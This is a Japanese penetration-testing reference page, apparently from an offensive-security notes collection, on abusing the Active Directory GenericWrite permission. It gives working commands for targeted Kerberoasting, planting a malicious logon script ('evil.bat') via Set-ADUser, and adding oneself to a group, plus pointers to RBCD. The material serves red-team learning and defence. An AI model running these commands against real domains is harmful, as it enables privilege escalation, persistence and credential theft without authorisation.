# GenericWrite の悪用

## 概要

`GenericWrite` は対象オブジェクトの属性を書き込む権限。GenericAll より限定的だが、SPN の設定・logon script の変更・グループメンバーの変更など、複数の攻撃手法につながる。

---

## 着火条件

BloodHound で `[現在のユーザー or グループ] --GenericWrite--> [ターゲットオブジェクト]` が確認できた場合。

---

## 対象オブジェクト別の悪用手法

### ケース1: ユーザーオブジェクトへの GenericWrite

**手法A: Targeted Kerberoasting（SPN を付与してハッシュ取得）**

ターゲットユーザーに SPN を設定し、Kerberoasting でハッシュを取得してクラックする。

```bash
python3 targetedKerberoast.py -v \
  -d '[DOMAIN]' \
  -u '[CURRENT_USER]' \
  -p '[PASSWORD]' \
  --dc-ip [DC_IP]
```

このツールは：
1. GenericWrite 権限があるユーザーに自動でSPNを追加
2. TGSハッシュを取得
3. 追加したSPNを自動でクリーンアップ

→ 取得したハッシュのクラック: `../Kerberos_Attacks/Kerberoasting.md`

**手法B: logon script の設定**

ターゲットがログインするたびにスクリプトが実行される：
```powershell
Set-ADUser -Identity [TARGET_USER] -ScriptPath '\\[DC]\netlogon\evil.bat'
```

### ケース2: グループオブジェクトへの GenericWrite

**グループメンバーの追加：**
```powershell
Add-ADGroupMember -Identity '[GROUP_NAME]' -Members '[CURRENT_USER]'
```

### ケース3: コンピューターオブジェクトへの GenericWrite

**RBCD の設定（msDS-AllowedToActOnBehalfOfOtherIdentity の変更）：**
→ 詳細: `../Delegation_Attacks/RBCD.md`

---

## GenericAll との違い

| 操作 | GenericWrite | GenericAll |
|------|-------------|-----------|
| 属性の書き込み | ✅ | ✅ |
| パスワードのリセット | ❌ | ✅ |
| オブジェクトの削除 | ❌ | ✅ |
| DACL の変更 | ❌ | ✅ |

---

## 注意点・落とし穴

- targetedKerberoast.py は SPN のクリーンアップまで自動で行うが、ツールが途中で失敗した場合は手動でクリーンアップが必要
- logon script の手法は、ターゲットユーザーが実際にログインするまで実行されない（環境によっては長時間待機が必要）
- SPN を設定する際、ターゲットアカウントが既にSPNを持っている場合は Kerberoasting が既に可能な場合もある

---

## 関連技術
- SPN 付与後のハッシュ取得 → `../Kerberos_Attacks/Kerberoasting.md`
- RBCD 攻撃 → `../Delegation_Attacks/RBCD.md`
